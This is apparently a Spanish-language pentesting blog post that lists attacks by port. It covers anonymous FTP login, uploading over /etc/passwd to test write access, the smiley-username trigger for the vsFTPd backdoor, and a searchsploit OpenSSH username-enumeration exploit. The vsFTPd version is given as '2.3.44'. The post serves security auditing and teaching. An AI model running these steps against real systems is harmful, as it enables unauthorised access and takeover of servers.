---
layout: single
title: Explotacion de puertos.
excerpt: "Aqui veremos como explotar algunas vulnerabilidades dependiendo del puerto que se este auditando."
date: 2022-11-20
classes: wide
header:
  teaser_home_page: true
categories:
  - Pentesting
  - Ethical Hacking
tags:
  - ftp
  - ssh
  - winrm
  - smb
  - puertos
---

Sino sabes por donde empezar al momento de encontrarte con uno de estos puertos aqui te enseño algunas cosas que deberias de probar cuando estes auditando.

## 21 ftp (File Transfer Protocol)
Protocolo para la tranferencia remota de archivos.
Cuando el puerto 21 este abierto puedes intentar conectarte como el usuario anonymous.
Debes especificar el protocolo seguido de la ip-address víctima. Posteriormente ingresas en el campo username anonnymous y en password lo dejas vacio dando solo enter.
```
 ftp <ip-address> -> username: anonymous
 		     password: 
```	  
Estos son algunos de los comandos que puedes utilizar una vez estes conectado al puerto ftp.
	dir -> Ver los directorios compartidos
        ls -la -> Listar por archivos ocultos
        put name_file -> Verificar si se tiene capacidad de escritura y así modificar un archivo de la maquina
		Ej; put file | put /etc/passwd
  
En caso de que se alla detectado la versión vsFTPd 2.3.44 al hacer el escaneo, debes buscar con la herramienta searchsploit un exploit que te permita explotar un backdoor que tiene esa versión que te permiterá ejecutar comandos de forma remota como el enviarte una reverse shell para ganar acceso al sistema. 

Con searchsploit -x unix/remote/49757.py examinas el contenido del exploit para ver como se usa o si tienes que modificar algunos parametros.

Con searchsploit -m unix/remote/49757.py copias el exploit a la ruta actual de trabajo.
```
searchsploit vsFTPd 2.3.44 -> unix/remote/49757.py -> Backdoor Command Execution
          nc <ip-address> 21 -> USER test:)
	  		     -> PASS pass
          ftp <ip-address> -> test:) 
	  		   -> pass
```

## 22 ssh (Secure Shell)
Protocolo usado para conectarse de forma remota a un servidor de forma segura.

Existe un exploit que te ayuda a enumerar usuarios existentes en un servidor si la versión esta entre 2.3 < 7.7. 

Solo se ejecuta el exploit con python y se le indica la ip-address víctima.
```
searchsploit username enumeration -> OpenSSH 2.3 < 7.7 - Username Enumeration ----- linux/remote/45233.py
python2 45233.py <ip-address>
```




